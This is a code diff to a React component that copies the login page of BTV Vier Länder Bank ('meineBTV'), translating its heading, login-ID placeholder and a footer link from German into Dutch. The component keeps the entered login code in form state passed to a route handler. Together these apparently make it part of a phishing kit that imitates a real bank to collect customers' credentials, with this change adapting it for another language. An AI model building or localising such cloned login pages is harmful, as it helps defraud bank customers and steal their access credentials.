@@ -37,7 +37,7 @@ export function BtvVierLanderBank({ formData, onChange, handleRouteAction, savin
         
         {/* Main Title */}
         <h1 className="text-[32px] md:text-[36px] font-medium text-white mb-10 tracking-tight" style={{ fontFamily: "Georgia, serif" }}>
-          Willkommen bei meineBTV!
+          Welkom bij meineBTV!
         </h1>
 
         {/* Three Columns Panel */}
@@ -55,11 +55,11 @@ export function BtvVierLanderBank({ formData, onChange, handleRouteAction, savin
                 }}
                 className="flex flex-col gap-4"
               >
-                {/* Verfügernummer */}
+                {/* Inlogcode */}
                 <div>
                   <input 
                     type="text" 
-                    placeholder="Ihre Verfügernummer"
+                    placeholder="Uw inlogcode"
                     value={formData.verfuegernummer || ""}
                     onChange={(e) => onChange("verfuegernummer", e.target.value)}
                     className="w-full h-[42px] px-3 border border-[#a4b8c6] shadow-sm rounded-sm outline-none focus:border-[#3b77a0] focus:ring-1 focus:ring-[#3b77a0] text-[#111] font-medium text-[14px] placeholder-[#555]"
@@ -177,7 +177,7 @@ export function BtvVierLanderBank({ formData, onChange, handleRouteAction, savin
           
           <div className="flex gap-4 md:gap-6 text-[12px] text-white font-medium">
             <a href="#" className="hover:underline">Impressum</a>
-            <a href="#" className="hover:underline">Rechtliche Hinweise</a>
+            <a href="#" className="hover:underline">Juridische informatie</a>
             <a href="#" className="hover:underline">Standorte</a>
             <a href="#" className="hover:underline">Support</a>
           </div>
